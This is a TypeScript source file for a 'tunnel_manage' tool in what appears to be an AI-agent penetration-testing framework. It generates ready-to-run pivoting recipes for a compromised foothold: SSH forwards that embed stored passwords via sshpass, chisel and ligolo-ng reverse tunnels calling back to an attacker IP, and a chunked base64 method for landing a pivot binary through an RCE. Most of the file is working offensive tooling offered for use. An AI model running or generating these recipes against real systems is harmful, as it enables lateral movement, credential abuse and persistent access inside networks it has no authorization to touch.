import { Effect, Schema } from "effect"
import { EngagementStore } from "@auditcode/core/engagement/store"
import type { EngagementSchema } from "@auditcode/core/engagement/schema"
import DESCRIPTION from "./tunnel-manage.txt"
import * as Tool from "./tool"

export const Parameters = Schema.Struct({
  action: Schema.Literals(["plan", "register", "list", "remove", "healthcheck"]).annotate({
    description:
      "plan: generate a COMPLETE runnable tunnel recipe (attacker-IP filled, binary staging + verify). register: record an established tunnel. list: show active tunnels. remove: mark session dead. healthcheck: record a liveness probe result (last_seen/alive).",
  }),
  host_ip: Schema.optional(Schema.String).annotate({
    description: "Target host IP (required for plan/register) — the FOOTHOLD the tunnel runs through",
  }),
  attacker_ip: Schema.optional(Schema.String).annotate({
    description:
      "Your (attacker) IP the target connects back to for reverse tunnels (chisel/ligolo). If omitted, falls back to $OPENCODE_ATTACKER_IP; else a <ATTACKER_IP> placeholder + a warning.",
  }),
  binary: Schema.optional(Schema.String).annotate({
    description: "Pivot binary to stage onto the foothold for chisel/ligolo (default: chisel).",
  }),
  pid: Schema.optional(Schema.Number).annotate({
    description: "PID of the established tunnel/shell (for register/healthcheck liveness).",
  }),
  alive: Schema.optional(Schema.Boolean).annotate({
    description: "healthcheck: set the session alive (true) or dead (false) after probing it.",
  }),
  tunnel_type: Schema.optional(
    Schema.Literals(["ssh_local", "ssh_dynamic", "socks", "port_forward", "chisel", "ligolo"]),
  ).annotate({
    description: "Tunnel type for plan/register",
  }),
  local_port: Schema.optional(Schema.Number).annotate({
    description: "Local port to bind",
  }),
  remote_target: Schema.optional(Schema.String).annotate({
    description: "Remote target host/IP for port forwarding",
  }),
  remote_port: Schema.optional(Schema.Number).annotate({
    description: "Remote target port for port forwarding",
  }),
  username: Schema.optional(Schema.String).annotate({
    description: "SSH/auth username (checked from engagement creds if omitted)",
  }),
  credential_id: Schema.optional(Schema.String).annotate({
    description: "Credential ID from engagement state",
  }),
  session_id: Schema.optional(Schema.String).annotate({
    description: "Session ID (for remove)",
  }),
})

const DEFAULT_LOCAL_PORT = 9050

function findCredsForHost(
  state: EngagementSchema.State,
  hostIp: string,
  credentialId?: string,
  username?: string,
): { user: string; value: string; credType: string; isKey: boolean } | undefined {
  if (credentialId) {
    const cred = state.credentials[credentialId]
    if (cred && cred.username && cred.value) {
      return {
        user: cred.username,
        value: cred.value,
        credType: cred.cred_type ?? "password",
        isKey: cred.cred_type === "ssh_key" || cred.cred_type === "private_key",
      }
    }
  }

  if (username) {
    for (const cred of Object.values(state.credentials)) {
      if (cred.username === username && cred.value) {
        return {
          user: cred.username,
          value: cred.value,
          credType: cred.cred_type ?? "password",
          isKey: cred.cred_type === "ssh_key" || cred.cred_type === "private_key",
        }
      }
    }
    return { user: username, value: "", credType: "password", isKey: false }
  }

  const host = state.hosts[hostIp]
  if (host) {
    for (const access of host.access) {
      const cred = Object.values(state.credentials).find(
        (c) => c.username === access.username && c.value,
      )
      if (cred) {
        return {
          user: cred.username!,
          value: cred.value!,
          credType: cred.cred_type ?? "password",
          isKey: cred.cred_type === "ssh_key" || cred.cred_type === "private_key",
        }
      }
    }
  }

  return undefined
}

// Staged base64-chunked binary transfer — for LANDING a pivot binary (chisel /
// ligolo-agent) on an egress-restricted, curl-less foothold whose RCE truncates
// output (the field-run killer). Chunk on the attacker box, append chunk-by-chunk
// through the RCE, reassemble + chmod on the target. This is the make-or-break step:
// a chisel/ligolo plan is useless if the binary can't reliably land.
function stagedTransferRecipe(binaryName: string, hostIp: string): string[] {
  return [
    `# --- Stage the ${binaryName} binary onto the foothold ${hostIp} (no curl/egress; RCE truncates output) ---`,
    `# On YOUR box: fetch the right STATIC linux binary once (match the target arch), then base64-chunk it:`,
    `#   # e.g. chisel:  curl -fsSL https://github.com/jpillora/chisel/releases/latest/download/chisel_<ver>_linux_amd64.gz | gunzip > ${binaryName}`,
    `#   split -b 2000 <(base64 -w0 ${binaryName}) /tmp/${binaryName}_chunk_   # 2KB single-line-safe chunks`,
    `# Push each chunk through the RCE (append on the target); order matters:`,
    `#   for f in /tmp/${binaryName}_chunk_*; do <RCE> "echo -n $(cat "$f") >> /tmp/${binaryName}.b64"; done`,
    `# Reassemble + run on the target:`,
    `#   <RCE> "base64 -d /tmp/${binaryName}.b64 > /tmp/${binaryName} && chmod +x /tmp/${binaryName} && /tmp/${binaryName} --version"`,
    `#   node-only foothold: <RCE> 'node -e "process.stdout.write(Buffer.from(require(\\"fs\\").readFileSync(\\"/tmp/${binaryName}.b64\\",\\"utf8\\"),\\"base64\\"))" > /tmp/${binaryName} && chmod +x /tmp/${binaryName}'`,
  ]
}

function socksVerifyRecipe(localPort: number, target?: string): string[] {
  const t = target ?? "<internal-host>"
  return [
    `# --- VERIFY the tunnel is live BEFORE routing work through it ---`,
    `# proxychains.conf (last line): socks5 127.0.0.1 ${localPort}`,
    `printf 'strict_chain\\n[ProxyList]\\nsocks5 127.0.0.1 ${localPort}\\n' > /tmp/pc.conf`,
    `proxychains4 -q -f /tmp/pc.conf nmap -sT -Pn -n -p 22,80,445 ${t}   # a hit through the proxy = tunnel UP`,
    `# Then register: tunnel_manage action:register (record pid + local_port) so the fleet routes via state_query sessions.`,
  ]
}

export function buildTunnelCommand(
  type: string,
  hostIp: string,
  creds: { user: string; value: string; isKey: boolean } | undefined,
  localPort: number,
  attackerIp: string,
  binaryName: string,
  remoteTarget?: string,
  remotePort?: number,
): string[] {
  const lines: string[] = []
  const user = creds?.user ?? "USER"
  const authFlag = creds?.isKey ? `-i '${creds.value}'` : ""
  const sshpassPrefix = creds && !creds.isKey && creds.value ? `sshpass -p '${creds.value}' ` : ""

  switch (type) {
    case "ssh_local":
    case "port_forward": {
      const rt = remoteTarget ?? "127.0.0.1"
      const rp = remotePort ?? 80
      lines.push(`# SSH local port forward: localhost:${localPort} -> ${rt}:${rp} via ${hostIp}`)
      lines.push(`${sshpassPrefix}ssh ${authFlag} -L ${localPort}:${rt}:${rp} ${user}@${hostIp} -N -f`.replace(/\s+/g, " ").trim())
      lines.push(`# Verify: curl http://127.0.0.1:${localPort}/`)
      break
    }
    case "ssh_dynamic":
    case "socks": {
      lines.push(`# SSH dynamic SOCKS proxy on localhost:${localPort} via ${hostIp}`)
      lines.push(`${sshpassPrefix}ssh ${authFlag} -D ${localPort} ${user}@${hostIp} -N -f`.replace(/\s+/g, " ").trim())
      lines.push(...socksVerifyRecipe(localPort, remoteTarget))
      break
    }
    case "chisel": {
      lines.push(`# Chisel reverse SOCKS: foothold ${hostIp} -> attacker ${attackerIp} -> SOCKS5 on 127.0.0.1:${localPort}`)
      lines.push(`# 1. On YOUR box (${attackerIp}): start the reverse server`)
      lines.push(`chisel server --reverse --port 8000 --socks5`)
      lines.push(...stagedTransferRecipe(binaryName, hostIp))
      lines.push(`# 2. On the foothold ${hostIp}: connect back and expose a reverse SOCKS on your box:${localPort}`)
      lines.push(`/tmp/${binaryName} client ${attackerIp}:8000 R:${localPort}:socks &`)
      lines.push(...socksVerifyRecipe(localPort, remoteTarget))
      break
    }
    case "ligolo": {
      lines.push(`# Ligolo-ng tunnel: foothold ${hostIp} -> attacker ${attackerIp}`)
      lines.push(`# 1. On YOUR box (${attackerIp}): tun iface + proxy`)
      lines.push(`sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up`)
      lines.push(`ligolo-proxy -selfcert -laddr 0.0.0.0:11601`)
      lines.push(...stagedTransferRecipe(binaryName, hostIp))
      lines.push(`# 2. On the foothold ${hostIp}: connect the agent back`)
      lines.push(`/tmp/${binaryName} -connect ${attackerIp}:11601 -ignore-cert &`)
      lines.push(`# 3. In the ligolo proxy console: session -> (select) -> start`)
      if (remoteTarget) {
        const subnet = remoteTarget.includes("/") ? remoteTarget : `${remoteTarget}/24`
        lines.push(`# then route the internal subnet through the agent:`)
        lines.push(`sudo ip route add ${subnet} dev ligolo`)
      }
      lines.push(`# Verify: proxychains not needed (route-based) — nmap -sT -Pn <internal-host> should now reach it.`)
      break
    }
    default:
      lines.push(`# Unknown tunnel type: ${type}`)
  }

  return lines
}

function sessionTypeFromTunnelType(tunnelType: string): "tunnel" | "socks_proxy" | "port_forward" {
  switch (tunnelType) {
    case "ssh_dynamic":
    case "socks":
      return "socks_proxy"
    case "ssh_local":
    case "port_forward":
      return "port_forward"
    default:
      return "tunnel"
  }
}

export const TunnelManageTool = Tool.define(
  "tunnel_manage",
  Effect.gen(function* () {
    const store = yield* EngagementStore.Service

    return {
      description: DESCRIPTION,
      parameters: Parameters,
      execute: (
        params: Schema.Schema.Type<typeof Parameters>,
        _ctx: Tool.Context,
      ): Effect.Effect<Tool.ExecuteResult> =>
        Effect.gen(function* () {
          const state = yield* store.get()
          if (!state) {
            return { title: "Error", metadata: {}, output: "No engagement loaded." }
          }

          switch (params.action) {
            case "plan": {
              if (!params.host_ip) {
                return { title: "Error", metadata: {}, output: "Error: host_ip is required for plan action." }
              }
              const tunnelType = params.tunnel_type ?? "ssh_dynamic"
              const localPort = params.local_port ?? DEFAULT_LOCAL_PORT
              const creds = findCredsForHost(state, params.host_ip, params.credential_id, params.username)
              const attackerIp = params.attacker_ip ?? process.env.OPENCODE_ATTACKER_IP ?? ""
              const binaryName = params.binary ?? "chisel"
              const needsAttacker = tunnelType === "chisel" || tunnelType === "ligolo"

              const lines: string[] = []
              lines.push(`Tunnel plan for ${params.host_ip} (${tunnelType}):`)
              lines.push("")

              if (!creds) {
                lines.push("WARNING: No credentials found for this host. SSH commands will use placeholder USER.")
                lines.push("Use cred_spray suggest to find valid credentials first.")
                lines.push("")
              } else {
                lines.push(`Credentials: ${creds.user} (${creds.credType})`)
                lines.push("")
              }

              if (needsAttacker && !attackerIp) {
                lines.push(
                  "WARNING: attacker_ip unknown — pass attacker_ip or set $OPENCODE_ATTACKER_IP. Using <ATTACKER_IP> placeholder; fill it before running the reverse tunnel.",
                )
                lines.push("")
              }

              const commands = buildTunnelCommand(
                tunnelType,
                params.host_ip,
                creds,
                localPort,
                attackerIp || "<ATTACKER_IP>",
                binaryName,
                params.remote_target,
                params.remote_port,
              )
              lines.push(...commands)

              lines.push("")
              lines.push("After establishing the tunnel, register it with: tunnel_manage action:register")

              return {
                title: `Tunnel plan: ${params.host_ip}`,
                metadata: { host_ip: params.host_ip, tunnel_type: tunnelType, local_port: localPort },
                output: lines.join("\n"),
              }
            }

            case "register": {
              if (!params.host_ip) {
                return { title: "Error", metadata: {}, output: "Error: host_ip is required for register action." }
              }
              const tunnelType = params.tunnel_type ?? "ssh_dynamic"
              const sessionType = sessionTypeFromTunnelType(tunnelType)
              const sessionId = params.session_id ?? `tunnel-${Date.now()}`
              const localPort = params.local_port ?? DEFAULT_LOCAL_PORT

              const nowIso = new Date().toISOString()
              yield* store.addLiveSession({
                id: sessionId,
                session_type: sessionType,
                host_ip: params.host_ip,
                port: localPort,
                username: params.username,
                pid: params.pid,
                established_at: nowIso,
                last_seen: nowIso,
                alive: true,
                local_port: localPort,
                remote_target: params.remote_target,
                details: `${tunnelType} tunnel`,
              })
              const updated = yield* store.get()
              if (updated) yield* store.save(updated)

              return {
                title: `Registered: ${sessionId}`,
                metadata: { session_id: sessionId, host_ip: params.host_ip },
                output: `Tunnel registered: ${sessionId} (${sessionType} via ${params.host_ip}, local port ${localPort})`,
              }
            }

            case "list": {
              const sessions = (state.live_sessions ?? []).filter((s) => s.alive !== false)
              if (sessions.length === 0) {
                return {
                  title: "No active tunnels",
                  metadata: { count: 0 },
                  output: "No active tunnels/sessions registered.",
                }
              }
              const lines: string[] = [`Active tunnels/sessions (${sessions.length}):`]
              for (const s of sessions) {
                const detail = s.remote_target ? ` -> ${s.remote_target}` : ""
                const lp = s.local_port ? ` local:${s.local_port}` : ""
                const user = s.username ? ` as ${s.username}` : ""
                lines.push(`  [${s.id}] ${s.session_type} ${s.host_ip}${s.port ? `:${s.port}` : ""}${detail}${lp}${user} (since ${s.established_at})`)
              }
              return {
                title: `${sessions.length} active tunnels`,
                metadata: { count: sessions.length },
                output: lines.join("\n"),
              }
            }

            case "remove": {
              if (!params.session_id) {
                return { title: "Error", metadata: {}, output: "Error: session_id is required for remove action." }
              }
              const removed = yield* store.removeLiveSession(params.session_id)
              if (!removed) {
                return { title: "Error", metadata: {}, output: `Session "${params.session_id}" not found.` }
              }
              const updated = yield* store.get()
              if (updated) yield* store.save(updated)
              return {
                title: `Removed: ${params.session_id}`,
                metadata: { session_id: params.session_id },
                output: `Session "${params.session_id}" removed.`,
              }
            }

            case "healthcheck": {
              if (!params.session_id) {
                return { title: "Error", metadata: {}, output: "Error: session_id is required for healthcheck action." }
              }
              const sess = (state.live_sessions ?? []).find((s) => s.id === params.session_id)
              if (!sess) {
                return { title: "Error", metadata: {}, output: `Session "${params.session_id}" not found.` }
              }
              yield* store.updateLiveSession(params.session_id, {
                last_seen: new Date().toISOString(),
                ...(params.alive !== undefined ? { alive: params.alive } : {}),
                ...(params.pid !== undefined ? { pid: params.pid } : {}),
              })
              const updated = yield* store.get()
              if (updated) yield* store.save(updated)
              const lp = sess.local_port ?? sess.port ?? DEFAULT_LOCAL_PORT
              const lines = [
                `Session "${params.session_id}" last_seen updated${params.alive !== undefined ? `, alive=${params.alive}` : ""}.`,
                "",
                "Re-verify it is still up before routing more work through it:",
                ...socksVerifyRecipe(lp, sess.remote_target),
              ]
              return {
                title: `Healthcheck: ${params.session_id}`,
                metadata: { session_id: params.session_id, alive: params.alive },
                output: lines.join("\n"),
              }
            }

            default:
              return { title: "Error", metadata: {}, output: `Unknown action: ${params.action}` }
          }
        }).pipe(Effect.orDie),
    }
  }),
)
